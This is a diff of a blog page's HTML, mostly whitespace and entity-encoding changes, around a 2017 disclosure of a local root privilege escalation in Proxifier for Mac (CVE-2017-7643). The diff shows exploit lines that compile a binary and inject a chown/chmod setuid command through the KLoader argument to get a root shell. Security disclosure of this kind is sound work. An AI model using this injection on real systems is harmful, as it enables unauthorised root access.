@@ -13,7 +13,7 @@
         <div id="menu">
                         <h3>Mark Wadham</h3>
             <ul>
-                <li><a href="/index.html">profile</a></li>
+                <li><a href="/">profile</a></li>
                 <li><a href="/blog.html">blog</a> <a href="/blog/rss"><img src="/img/rss.png" /></a></li>
                 <li><a href="/cves.html">CVEs</a></li>
                 <li><a href="/jsdemos.html">js demos</a></li>
@@ -23,16 +23,17 @@
                 <li class="small">linkedin: <a href="https://uk.linkedin.com/in/mark-wadham-14ab49a6">379069834</a></li>
                 <li class="red space small"></li>
             </ul>
-
         </div>
         <div id="content">
             <div id="main-content">
-                                            <div class="post">
+                            
+                            <div class="post">
                 <h2><a href="/blog/cve20177643-local-root-privesc-in-proxifier-for-mac--218.html">CVE-2017-7643 Local root privesc in Proxifier for Mac <= 2.18</a></h2>
                 <h3>10 Apr 2017 21:19  | <a class="tag" href="/blog/tag/security.html">security</a> | <a class="tag" href="/blog/tag/exploits.html">exploits</a> | <a class="tag" href="/blog/tag/macOS.html">macOS</a></h3>
+                
                   <pre>Proxifier 2.18 (also 2.17 and possibly some earlier version) ships with a
 KLoader binary which it installs suid root the first time Proxifier is run. This
-binary serves a single purpose which is to load and unload Proxifier&#39;s kernel
+binary serves a single purpose which is to load and unload Proxifier&#x27;s kernel
 extension.
 
 Unfortunately it does this by taking the first parameter passed to it on the
@@ -41,12 +42,12 @@ commandline without any sanitisation and feeding it straight into system().
 This means not only can you load any arbitrary kext as a non-root user but you
 can also get a local root shell.
 
-Although this is a bit of a terrible bug that shouldn&#39;t be happening in 2017,
-Proxifier&#39;s developers fixed the issue in record time so that&#39;s something!
+Although this is a bit of a terrible bug that shouldn&#x27;t be happening in 2017,
+Proxifier&#x27;s developers fixed the issue in record time so that&#x27;s something!
 
 Everyone using Proxifier for Mac should update to 2.19 as soon as possible.
 
-<a href="https://m4.rkw.io/proxifier_privesc.sh.txt">https://m4.rkw.io/proxifier_privesc.sh.txt</a>
+https://m4.rkw.io/proxifier_privesc.sh.txt
 6040180f672a2b70511a483e4996d784f03e04c624a8c4e01e71f50709ab77c3
 -------------------------------------------------------------------
 
@@ -75,13 +76,14 @@ EOF
 
 gcc -o /tmp/a a.c
 rm -f a.c
-/Applications/Proxifier.app/Contents/KLoader &#39;blah; chown root:wheel /tmp/a ; chmod 4755 /tmp/a&#39;
+/Applications/Proxifier.app/Contents/KLoader &#x27;blah; chown root:wheel /tmp/a ; chmod 4755 /tmp/a&#x27;
 /tmp/a
 
--------------------------------------------------------------------</pre>
+-------------------------------------------------------------------
+</pre>
+                
             </div>
-
-
+            
             </div>
             <div id="right-content">
                 
@@ -91,39 +93,67 @@ rm -f a.c
 
             <ul>
               <li>&nbsp;&nbsp;[year]</li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2022.html">2022</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2021.html">2021</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2020.html">2020</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2019.html">2019</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2018.html">2018</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2017.html">2017</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2016.html">2016</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2015.html">2015</a></li>
+              
             </ul>
 
             <ul>
               <li>&nbsp;&nbsp;[tag]</li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/AWS.html">AWS</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/agile.html">agile</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/apple.html">apple</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/bash.html">bash</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/cryptocurrency.html">cryptocurrency</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/development.html">development</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/exploits.html">exploits</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/iOS.html">iOS</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/linux.html">linux</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/macOS.html">macOS</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/mining.html">mining</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/mysql.html">mysql</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/php.html">php</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/ruby.html">ruby</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/scrum.html">scrum</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/security.html">security</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/touchID.html">touchID</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/vim.html">vim</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/work.html">work</a></li>
+              
             </ul>
-
             </div>
         </div>
 				<script>
